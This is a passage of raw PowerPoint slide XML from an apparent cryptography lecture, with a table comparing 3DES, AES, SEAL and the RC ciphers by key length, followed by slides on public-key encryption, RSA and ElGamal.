                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>112 and 168</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Based on using DES three times which means that the input data is encrypted three times and therefore considered much stronger than DES.</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>However, it is rather slow compared to some new block ciphers such as AES. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="804960">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>AES</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>128, 192, and 256</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Fast in both software and hardware, is relatively easy to implement, and requires little memory. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>As a new encryption standard, it is currently being deployed on a large scale. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="774360">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>Software Encryption Algorithm (SEAL)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>160</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>SEAL is an alternative algorithm to DES, 3DES, and AES. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>It uses a 160-bit encryption key and has a lower impact to the CPU when compared to other software-based algorithms. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="1115640">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="1" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>The RC series</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC2 (40 and 64)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC4 (up to256)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC5 (up to 2040)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr algn="ctr">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="221"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC6 (128, 192, and 256)</a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1100" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr lIns="84600" rIns="84600" anchor="ctr">
                      <a:noAutofit/>
                    </a:bodyPr>
                    <a:p>
                      <a:pPr marL="171360" indent="-171360">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>A set of symmetric-key encryption algorithms invented by Ron Rivest. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="171360" indent="-171360">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC1 was never published and RC3 was broken before ever being used. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="171360" indent="-171360">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC4 is the world's most widely used stream cipher. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr marL="171360" indent="-171360">
                        <a:lnSpc>
                          <a:spcPct val="100000"/>
                        </a:lnSpc>
                        <a:spcBef>
                          <a:spcPts val="241"/>
                        </a:spcBef>
                        <a:buNone/>
                        <a:tabLst>
                          <a:tab algn="l" pos="0"/>
                        </a:tabLst>
                      </a:pPr>
                      <a:r>
                        <a:rPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:latin typeface="Arial"/>
                        </a:rPr>
                        <a:t>RC6, a 128-bit block cipher based heavily on RC5, was an AES finalist developed in 1997. </a:t>
                      </a:r>
                      <a:endParaRPr b="0" lang="en-US" sz="1200" spc="-1" strike="noStrike">
                        <a:latin typeface="Arial"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr anchor="ctr" marL="84600" marR="84600">
                    <a:lnL w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnL>
                    <a:lnR w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnR>
                    <a:lnT w="12240">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnT>
                    <a:lnB w="28080">
                      <a:solidFill>
                        <a:srgbClr val="000000"/>
                      </a:solidFill>
                    </a:lnB>
                    <a:noFill/>
                  </a:tcPr>
                </a:tc>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>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0"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Asymmetric Key Cryptosystems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="901"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"Public-Key" Encryption</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Slow! Public/private key pair</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Public keys widely distributed within digital certificates</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Used as a secure channel for symmetric key exchange</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4666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Technical non-repudiation via digital signatures</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="360"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="902" name="Picture 2" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219320" y="3733920"/>
            <a:ext cx="7019640" cy="2895120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3"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Asymmetric Key Cryptosystems</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="904"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RSA</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ElGamal</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pic>
        <p:nvPicPr>
          <p:cNvPr id="905" name="Picture 1" descr=""/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5638680" y="2666880"/>
            <a:ext cx="2158560" cy="3238200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="906" name="TextBox 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5636160" y="6095880"/>
            <a:ext cx="2241360" cy="363960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
